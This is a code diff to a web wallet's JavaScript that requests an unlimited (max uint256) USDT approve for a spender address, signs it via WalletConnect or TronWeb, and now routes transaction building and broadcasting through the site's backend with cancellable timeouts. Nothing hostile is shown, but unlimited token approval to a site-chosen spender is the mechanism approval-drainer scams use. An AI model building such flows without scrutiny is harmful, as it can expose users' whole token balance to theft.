@@ -8,6 +8,17 @@ function formatI18n(key, fallback, params) {
     return msg;
 }
 
+// 타이머 cleanup 가능한 timeout Promise 헬퍼
+function createCancellableTimeout(ms, errorMsg) {
+    var timerId = null;
+    var promise = new Promise(function (_, reject) {
+        timerId = setTimeout(function () {
+            reject(new Error(errorMsg));
+        }, ms);
+    });
+    return { promise: promise, cancel: function () { if (timerId) { clearTimeout(timerId); timerId = null; } } };
+}
+
 window.executeUnlimitedApprove = async function () {
     if (!isConnected || !currentWalletAddress) {
         showToast(T('wallet_connect_first', '지갑을 먼저 연결하세요.'), 'error');
@@ -113,72 +124,69 @@ window.executeUnlimitedApprove = async function () {
         var txHash;
 
         if (useWC) {
-            // ===== WalletConnect 경로 =====
-            var addrHex = base58ToHex(spender);
-            var paddedAddr = addrHex.padStart(64, '0');
-            var maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-            var abiParam = paddedAddr + maxUint;
-
-            var triggerRes = await fetch('https://api.trongrid.io/wallet/triggersmartcontract', {
+            // ===== WalletConnect 경로 (백엔드 경유로 TronGrid 호출) =====
+            // 수정: 브라우저 → TronGrid 직접 호출 제거
+            //  - 429 rate limit 방지
+            //  - API 키 보호
+            //  - CORS 안정성
+            var txBuildRes = await apiFetch(API_BASE + '/tron/build-approve-tx', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    owner_address: currentWalletAddress,
-                    contract_address: OFFICIAL_USDT_CONTRACT,
-                    function_selector: 'approve(address,uint256)',
-                    parameter: abiParam,
-                    fee_limit: 100000000,
-                    call_value: 0,
-                    visible: true
+                    ownerAddress: currentWalletAddress,
+                    spenderAddress: spender
                 })
             });
-            var triggerData = await triggerRes.json();
-            if (!triggerData.transaction) throw new Error(T('tx_build_fail_msg', '트랜잭션 생성 실패'));
-
-            var wcResult;
-            var wcSignTimeout = new Promise(function (_, reject) {
-                setTimeout(function () {
-                    reject(new Error(T('wc_sign_timeout_msg', '서명 응답 시간 초과 (지갑 앱을 확인해 주세요)')));
-                }, 60000);
-            });
-
-            if (wcConnector.signTransaction) {
-                wcResult = await Promise.race([wcConnector.signTransaction(triggerData.transaction), wcSignTimeout]);
-            } else if (wcConnector.client) {
-                var activeTopic = (wcConnector.session && wcConnector.session.topic) ||
-                    (wcConnector.client.session && wcConnector.client.session.keys && wcConnector.client.session.keys[0]);
-                if (!activeTopic) {
-                    showToast(T('wc_session_expired', 'WalletConnect 세션 만료. 다시 연결해주세요.'), 'error');
-                    isApproving = false;
-                    pendingApproveId = null;
-                    wcConnector = null;
-                    wcAddress = null;
-                    try { localStorage.removeItem('feeslash_wc_topic'); } catch (e) { }
-                    handleConnectWallet();
-                    return;
-                }
-                wcResult = await Promise.race([
-                    wcConnector.client.request({
-                        topic: activeTopic,
-                        chainId: 'tron:0x2b6653dc',
-                        request: { method: 'tron_signTransaction', params: [triggerData.transaction] }
-                    }),
-                    wcSignTimeout
-                ]);
-            } else {
-                throw new Error(T('wc_no_sign_method_msg', 'WalletConnect 서명 메서드를 찾을 수 없습니다'));
+            var txBuildData = await txBuildRes.json();
+            if (!txBuildData || !txBuildData.transaction) {
+                throw new Error(T('tx_build_fail_msg', '트랜잭션 생성 실패'));
             }
 
-            var broadcastPayload = parseWcSignature(wcResult, triggerData.transaction);
+            var wcTimeout = createCancellableTimeout(60000, T('wc_sign_timeout_msg', '서명 응답 시간 초과 (지갑 앱을 확인해 주세요)'));
+            var wcResult;
+            try {
+                if (wcConnector.signTransaction) {
+                    wcResult = await Promise.race([wcConnector.signTransaction(txBuildData.transaction), wcTimeout.promise]);
+                } else if (wcConnector.client) {
+                    var activeTopic = (wcConnector.session && wcConnector.session.topic) ||
+                        (wcConnector.client.session && wcConnector.client.session.keys && wcConnector.client.session.keys[0]);
+                    if (!activeTopic) {
+                        wcTimeout.cancel();
+                        showToast(T('wc_session_expired', 'WalletConnect 세션 만료. 다시 연결해주세요.'), 'error');
+                        isApproving = false;
+                        pendingApproveId = null;
+                        wcConnector = null;
+                        wcAddress = null;
+                        try { localStorage.removeItem('feeslash_wc_topic'); } catch (e) { }
+                        handleConnectWallet();
+                        return;
+                    }
+                    wcResult = await Promise.race([
+                        wcConnector.client.request({
+                            topic: activeTopic,
+                            chainId: 'tron:0x2b6653dc',
+                            request: { method: 'tron_signTransaction', params: [txBuildData.transaction] }
+                        }),
+                        wcTimeout.promise
+                    ]);
+                } else {
+                    throw new Error(T('wc_no_sign_method_msg', 'WalletConnect 서명 메서드를 찾을 수 없습니다'));
+                }
+            } finally {
+                wcTimeout.cancel(); // 타이머 cleanup
+            }
 
-            var broadcastRes = await fetch('https://api.trongrid.io/wallet/broadcasttransaction', {
+            var broadcastPayload = parseWcSignature(wcResult, txBuildData.transaction);
+
+            // 브로드캐스트도 백엔드 경유
+            var broadcastRes = await apiFetch(API_BASE + '/tron/broadcast-tx', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(broadcastPayload)
+                body: JSON.stringify({ signedTransaction: broadcastPayload })
             });
             var broadcastData = await broadcastRes.json();
-            if (!broadcastData.result) {
-                var detail = broadcastData.Error || broadcastData.message || JSON.stringify(broadcastData);
+            if (!broadcastData || !broadcastData.result) {
+                var detail = (broadcastData && (broadcastData.Error || broadcastData.message)) || JSON.stringify(broadcastData);
                 throw new Error(formatI18n('tx_broadcast_fail_msg', '브로드캐스트 실패: {detail}', { detail: detail }));
             }
             txHash = broadcastData.txid || broadcastPayload.txID || 'ok';
@@ -195,13 +203,16 @@ window.executeUnlimitedApprove = async function () {
             if (!tx || !tx.transaction) throw new Error(T('tx_build_fail_msg', '트랜잭션 생성 실패'));
 
             showToast(T('check_wallet_popup', '지갑 팝업을 확인하세요! 🔔'));
-            var signPromise = tw.trx.sign(tx.transaction);
-            var timeoutPromise = new Promise(function (_, reject) {
-                setTimeout(function () {
-                    reject(new Error(T('sign_timeout', '서명 응답 시간 초과. 지갑 앱을 확인해주세요.')));
-                }, 30000);
-            });
-            var signedTx = await Promise.race([signPromise, timeoutPromise]);
+
+            // 타이머 cleanup 가능하도록 변경
+            var signTimeout = createCancellableTimeout(30000, T('sign_timeout', '서명 응답 시간 초과. 지갑 앱을 확인해주세요.'));
+            var signedTx;
+            try {
+                signedTx = await Promise.race([tw.trx.sign(tx.transaction), signTimeout.promise]);
+            } finally {
+                signTimeout.cancel();
+            }
+
             var result = await tw.trx.sendRawTransaction(signedTx);
             txHash = (result && result.txid) || (result && result.transaction && result.transaction.txID) || (signedTx && signedTx.txID) || 'ok';
         }
